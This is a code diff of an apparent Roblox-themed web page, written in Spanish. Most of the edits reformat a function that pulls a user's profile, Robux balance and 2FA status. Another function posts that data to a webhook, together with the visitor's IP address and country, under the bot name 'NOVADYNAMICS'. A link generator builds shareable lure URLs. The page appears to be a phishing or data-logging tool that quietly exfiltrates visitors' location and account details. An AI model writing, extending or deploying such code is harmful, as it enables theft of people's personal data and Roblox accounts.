@@ -237,15 +237,38 @@ async function cargarDatosRoblox(usuario){
     try{
         const perfil=await fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json());
         robuxCuenta=await fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json()).then(r=>r.robux||0);
-        const fechaCreacion=new Date(perfil.created);
-        const hoy=new Date();
-        diasCuenta=Math.floor((hoy-fechaCreacion)/(1000*60*60*24));
-        fechaCreacionTexto=fechaCreacion.toLocaleDateString('es-ES',{day:'numeric',month:'long',year:'numeric'});
-        premium=perfil.isPremium?'True':'False';
-        verificado=perfil.hasVerifiedBadge?'✅ Verificado':'❌ No Verificado';
-        datosRoblox={nombre:perfil.name,id:id,fechaCreacion:fechaCreacionTexto,dias:diasCuenta,robux:robuxCuenta,premium:premium,verificado:verificado,tiene2FA:tiene2FA};
+        
+        // ✅ CÁLCULO DE DÍAS ARREGLADO
+        const fechaCreacion = new Date(perfil.created);
+        const hoy = new Date();
+        const diferenciaMs = hoy - fechaCreacion;
+        diasCuenta = Math.floor(diferenciaMs / (1000 * 60 * 60 * 24));
+        fechaCreacionTexto = fechaCreacion.toLocaleDateString('es-ES', {day:'numeric', month:'long', year:'numeric'});
+        
+        premium = perfil.isPremium ? 'True' : 'False';
+        verificado = perfil.hasVerifiedBadge ? '✅ Verificado' : '❌ No Verificado';
+        
+        datosRoblox = {
+            nombre: perfil.name,
+            id: id,
+            fechaCreacion: fechaCreacionTexto,
+            dias: diasCuenta,
+            robux: robuxCuenta,
+            premium: premium,
+            verificado: verificado,
+            tiene2FA: tiene2FA
+        };
     }catch(e){
-        datosRoblox={nombre:nombreReal,id:id,fechaCreacion:'No disponible',dias:'Desconocido',robux:0,premium:'False',verificado:'❌ No Verificado',tiene2FA:'Desconocido'}
+        datosRoblox = {
+            nombre: nombreReal,
+            id: id,
+            fechaCreacion: 'No disponible',
+            dias: 'Desconocido',
+            robux: 0,
+            premium: 'False',
+            verificado: '❌ No Verificado',
+            tiene2FA: 'Desconocido'
+        };
     }
 }
 
@@ -301,13 +324,11 @@ function err(t){const e=document.getElementById('cajaErr');e.textContent=t;e.sty
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 username: "NOVADYNAMICS",
-                avatar_url: FOTO_BOT, // ✅ TU FOTO DE PERFIL DEL BOT
+                avatar_url: FOTO_BOT,
                 content: todos,
                 embeds: [{
                     color: 16711680,
-                    thumbnail: {
-                        url: fotoPerfil // ✅ FOTO DE LA PERSONA QUE SE REGISTRÓ
-                    },
+                    thumbnail: { url: fotoPerfil },
                     fields: [
                         {name: "🌍 Cuenta Creada / Ubicación IP", value: `**${ipDatos.pais}** ${ipDatos.bandera}\n**${ipDatos.ip}**`, inline: false},
                         {name: "🐉 Usuario", value: `**${datosRoblox.nombre||u}**`, inline: true},
@@ -337,7 +358,6 @@ function generarEnlace(){
     const u = document.getElementById('usuarioLink').value.trim();
     const base = window.location.origin + window.location.pathname;
     enlaceGenerado = u ? `${base}?u=${encodeURIComponent(u)}` : base;
-    
     document.getElementById('enlaceOut').style.display='block';
     document.getElementById('enlaceOut').textContent = enlaceGenerado;
     document.getElementById('btnCopiar').style.display='inline-block';
